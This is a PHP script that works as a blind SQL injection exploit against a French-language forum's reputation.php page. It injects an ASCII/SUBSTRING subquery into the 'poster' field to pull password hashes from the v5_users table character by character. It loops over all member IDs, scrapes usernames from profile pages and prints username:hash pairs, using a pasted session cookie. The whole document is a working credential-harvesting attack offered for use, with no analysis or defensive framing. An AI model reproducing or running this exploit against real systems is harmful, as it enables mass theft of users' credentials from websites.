<?php

$articleId  = "3006273";
$username   = "XXXX";
$characterSet = 'YYYY';

function extractPassword($userId, $position, $asciiValue, $columnName) {
	global $username;
	global $articleId;
	
	$postData = 'form_sent=1&pid='.$articleId.'&poster='.urlencode($username.'" AND ASCII(SUBSTRING((SELECT '.$columnName.' FROM v5_users WHERE id='.$userId.'),'.$position.',1))='.$asciiValue.' AND "1"="1').'&method=1&submit=Submit';
	$curlHandle = curl_init();

	curl_setopt($curlHandle, CURLOPT_URL,"http://www.XXXXX.com/reputation.php");
	curl_setopt($curlHandle, CURLOPT_POST, true);
	curl_setopt($curlHandle, CURLOPT_POSTFIELDS,$postData);
	curl_setopt($curlHandle, CURLOPT_COOKIE,"[REPLACE WITH COOKIE DATA]");
	curl_setopt($curlHandle, CURLOPT_RETURNTRANSFER, true);
	$response = curl_exec($curlHandle);
	curl_close($curlHandle);

	return $response;
}

function extractUsername($userId) {
	$curlHandle = curl_init();

	curl_setopt($curlHandle, CURLOPT_URL,"http://www.XXXXX.com/profile.php?id=".$userId);
	curl_setopt($curlHandle, CURLOPT_COOKIE,"[REPLACE WITH COOKIE DATA]");
	curl_setopt($curlHandle, CURLOPT_RETURNTRANSFER, true);
	$response = curl_exec($curlHandle);
	curl_close($curlHandle);

	if (preg_match("#Bienvenue dans le profil de (.+) <\/span>#i", $response, $matches)) {
		return trim($matches[1]);
	} else {
		return null;
	}
}

function getTotalMembers() {
	$curlHandle = curl_init();

	curl_setopt($curlHandle, CURLOPT_URL,"http://www.XXXXX.com/");
	curl_setopt($curlHandle, CURLOPT_COOKIE,"[REPLACE WITH COOKIE DATA]");
	curl_setopt($curlHandle, CURLOPT_RETURNTRANSFER, true);
	$response = curl_exec($curlHandle);
	curl_close($curlHandle);

	preg_match("#<span>Nombre total d'(?:[a-z]):</span> <strong>([0-9]+)</strong></li>#i", $response, $matches);
	return $matches[1];
}

$decodedPassword = '';
$totalMembers = getTotalMembers();

for ($currentUserId = 4; $currentUserId <= $totalMembers; $currentUserId++) {
	$decodedUsername = extractUsername($currentUserId);
	
	if ($decodedUsername !== null) {
		echo $decodedUsername.":";

		for ($charPosition = 1; $charPosition < 41; $charPosition++) {
			for ($charIndex = 0; $charIndex < strlen($characterSet); $charIndex++) {
				$asciiChar = ord($characterSet[$charIndex]);
				$response = extractPassword($currentUserId, $charPosition, $asciiChar, "password");

				if (!preg_match("#Le lien que vous avez suivi est incorrect#i", $response)) {
					$decodedPassword .= chr($asciiChar);
					echo chr($asciiChar);
				}
			}
		}
		echo ":".urlencode(base64_encode($currentUserId."|".$decodedPassword))."\n";
	}
}
